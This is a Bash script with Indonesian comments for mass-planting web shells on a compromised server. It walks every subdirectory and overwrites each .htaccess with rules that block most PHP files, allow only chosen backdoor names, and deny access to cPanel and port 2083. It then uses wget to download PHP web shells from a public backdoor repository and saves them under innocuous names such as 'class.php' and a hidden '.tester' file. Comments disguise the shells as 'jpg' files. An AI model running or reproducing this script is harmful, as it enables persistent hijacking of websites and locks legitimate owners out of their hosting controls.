#!/bin/bash

# Fungsi untuk mengecek setiap direktori dan melakukan aksi berdasarkan izinnya
checkAndPlaceHtaccess() {
    local dirPath="$1"
    local htaccessContent=$(cat << 'EOF'
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.S*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.s*>
    Order Deny,Allow
    Deny from all
</Files>
<FilesMatch "^(index1.php|class.php)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>
RewriteEngine On
RewriteBase /

RewriteRule ^$ /index1.php [L]

RewriteCond %{SERVER_PORT} 2083 [OR]
RewriteCond %{REQUEST_URI} ^/(cpanel|cPanel|controlpanel|cPanel_login) [NC]
RewriteRule ^ - [F]

RewriteCond %{REQUEST_URI} !^/(tykungterosss)/ [NC]

RewriteCond %{REQUEST_FILENAME} -d
RewriteRule ^ - [L]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index1.php [L]
EOF
    )


    # Coba tempatkan atau timpa file .htaccess
    local htaccessPath="${dirPath}/.htaccess"
    if echo -e "$htaccessContent" > "$htaccessPath" 2>/dev/null; then
        # Jika berhasil, tampilkan pesan dengan warna hijau
        echo -e "\033[32mFile .htaccess telah ditambahkan atau ditimpa di: $htaccessPath\033[0m"
    else
        # Jika gagal, tampilkan pesan dengan warna merah
        echo -e "\033[31mDirektori tidak dapat diakses atau .htaccess tidak dapat ditimpa: $dirPath\033[0m"
    fi

    sleep 1 # Penundaan antara operasi untuk mencegah overload
}

# Fungsi untuk mengunduh dan mengubah nama file jpg
downloadAndRenamejpg() {
    local dirPath="$1"
    # Mendefinisikan array dengan URL untuk setiap file jpg
    local jpgUrls=(
        "https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/mini.php"
        "https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/sadrazam.php"
    )

    # Mendefinisikan array dengan nama file yang diinginkan
    local fileNames=(
        "trash236735.php"
        "class.php"
        "class-IXV.php"
        "management.php"
        ".tester23634.php"
    )

    # Mengacak indeks dari daftar nama file
    local shuffledIndices=($(shuf -e "${!fileNames[@]}"))

    # Loop melalui setiap URL dalam array jpgUrls untuk mengunduh setiap file jpg
    for ((i=0; i<${#jpgUrls[@]}; i++)); do
        local randomIndex=${shuffledIndices[i]}
        local tempFile="${dirPath}/${fileNames[randomIndex]}"
        wget -q -O "$tempFile" "${jpgUrls[i]}" && echo -e "\033[33mFile jpg terunduh dan disimpan sebagai: $tempFile\033[0m"
        sleep 1 # Penundaan 3 detik antara pengunduhan
    done
}


# Fungsi rekursif untuk menelusuri direktori
recurseDirectories() {
    local currentDir="$1"
    # Loop melalui setiap item dalam direktori
    for item in "$currentDir"/*; do
        if [ -d "$item" ]; then
            # Jika item adalah direktori, cek dan tempatkan .htaccess jika perlu
            checkAndPlaceHtaccess "$item"

            # Mengunduh dan mengubah nama file jpg
            downloadAndRenamejpg "$item"

            # Rekursi ke dalam direktori
            recurseDirectories "$item"
        fi
    done
}

# Mulai dari direktori skrip ini berada atau direktori yang diberikan
startDir=${1:-$(pwd)}

# Panggil fungsi utama dengan direktori awal
recurseDirectories "$startDir"
